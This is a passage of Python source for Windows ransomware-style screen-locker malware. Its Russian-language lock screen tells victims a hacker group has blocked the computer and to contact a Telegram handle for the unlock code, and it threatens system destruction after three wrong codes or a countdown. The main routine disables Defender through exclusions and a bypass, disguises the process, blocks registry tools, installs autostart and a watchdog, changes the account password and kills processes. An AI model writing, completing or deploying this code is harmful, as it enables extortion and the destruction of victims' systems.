    label2 = tk.Label(win, text="", bg="#000000", fg="#656464",
                      font=("Consolas", 15), anchor="w", justify="left")
    label2.pack(pady=(20, 0), anchor="w")

    st = {"i": 0, "i2": 0}

    def typing():
        if st["i"] <= len(boot1):
            label.config(text=boot1[:st["i"]])
            st["i"] += 1
            win.after(2, typing)
        elif st["i2"] <= len(boot2):
            label2.config(text=boot2[:st["i2"]])
            st["i2"] += 1
            win.after(2, typing)
        else:
            locker_screen()

    def unlock():
        kill_watchdog()
        _STOP_FLAG.set()
        remove_autostart()
        uninstall_keyboard_hook()
        clear_reg_blocks()
        try:
            subprocess.Popen(["explorer.exe"], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass
        win.after(1000, win.destroy)

    def locker_screen():
        for w in win.winfo_children():
            w.destroy()

        schedule_screams(win)

        tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!",
                 fg="#4f4f4f", bg="#000000",
                 font=("Consolas", 18)).pack(pady=(50, 20))

        tk.Label(win, text=(
            f"Ваш компьютер подвержен блокировке хакерской группой {OPERATOR}.\n"
            "ВВОДИТЕ ПАРОЛЬ АККУРАТНО. 3 ОШИБКИ = УНИЧТОЖЕНИЕ СИСТЕМЫ.\n\n"
            f"За кодом писать @{OPERATOR} (Telegram)"),
            fg="#AAAAAA", bg="#000000", font=("Consolas", 13),
            justify="center").pack(pady=20)

        global_lbl = tk.Label(win, text="", fg="#FF0000", bg="#000000",
                              font=("Consolas", 14, "bold"))
        global_lbl.pack(pady=(10, 0))

        entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF",
                         font=("Consolas", 16), justify="center", width=25)
        entry.pack(pady=10)
        entry.focus_force()

        def keep_focus(_e=None):
            try:
                entry.focus_force()
            except Exception:
                pass

        entry.bind("<FocusOut>", keep_focus)
        win.after(200, keep_focus)

        current = {"attempts": load_attempts()}
        left0 = max(0, 3 - current["attempts"])
        result = tk.Label(win, text=f"Попыток осталось: {left0}",
                          fg="#FF0000", bg="#000000", font=("Consolas", 12))
        result.pack(pady=5)

        def destroy_and_show():
            save_attempts(0)
            install_keyboard_hook()
            full_destroy(force=True)
            for w in win.winfo_children():
                w.destroy()
            win.configure(bg="#FF0000")
            tk.Label(win, text="ДОИГРАЛСЯ...", fg="#000000", bg="#FF0000",
                     font=("Impact", 60), justify="center").pack(expand=True, fill="both")

        def global_tick():
            left = deadline - time.time()
            if left <= 0:
                global_lbl.config(text="ВРЕМЯ ВЫШЛО")
                destroy_and_show()
                return
            m, s = divmod(int(left), 60)
            global_lbl.config(text=f"Система будет уничтожена через {m:02d}:{s:02d}")
            win.after(500, global_tick)

        def check_code():
            h = hashlib.sha256(_SALT + entry.get().encode()).hexdigest()
            if h == CORRECT_HASH:
                result.config(text="Код правильный!", fg="#00FF00")
                save_attempts(0)
                unlock()
                return
            current["attempts"] += 1
            save_attempts(current["attempts"])
            entry.delete(0, tk.END)
            left = 3 - current["attempts"]
            if left > 0:
                result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
                return
            destroy_and_show()

        def forgot_password():
            result.config(text=f"Обратитесь к @{OPERATOR} в Telegram.", fg="#FF6600")
            try:
                webbrowser.open(f"https://t.me/{OPERATOR}")
            except Exception:
                pass

        tk.Button(win, text="ПРОВЕРИТЬ", command=check_code,
                  bg="#222222", fg="#FFFFFF",
                  font=("Consolas", 12), bd=0, padx=20, pady=8).pack(pady=10)

        tk.Button(win, text="Забыли пароль?", command=forgot_password,
                  bg="#000000", fg="#555555",
                  activebackground="#000000", activeforeground="#888888",
                  font=("Consolas", 10, "underline"), bd=0,
                  cursor="hand2").pack(pady=(2, 0))

        entry.bind("<Return>", lambda e: check_code())
        global_tick()

    typing()
    win.mainloop()

# ================= ENTRY =================
def main():
    if len(sys.argv) >= 3 and sys.argv[1] == "--watchdog":
        try:
            parent = int(sys.argv[2])
        except Exception:
            parent = 0
        watchdog_main(parent)
        return

    ensure_admin()

    try:
        add_exclusions()
    except Exception:
        pass

    threading.Thread(target=run_defender_bypass_and_log, daemon=True).start()

    if is_destroyed():
        full_destroy(force=True)
        sys.exit(0)

    self_masquerade()
    apply_reg_blocks()
    install_autostart()
    init_scream()
    spawn_watchdog()

    try:
        threading.Thread(target=change_account_password, daemon=True).start()
    except Exception:
        pass

    threading.Thread(target=blocking_loop, daemon=True).start()
    threading.Thread(target=wmi_kill_loop, daemon=True).start()
    threading.Thread(target=desktop_watchdog, daemon=True).start()

    run_ui()


if __name__ == "__main__":
    main()
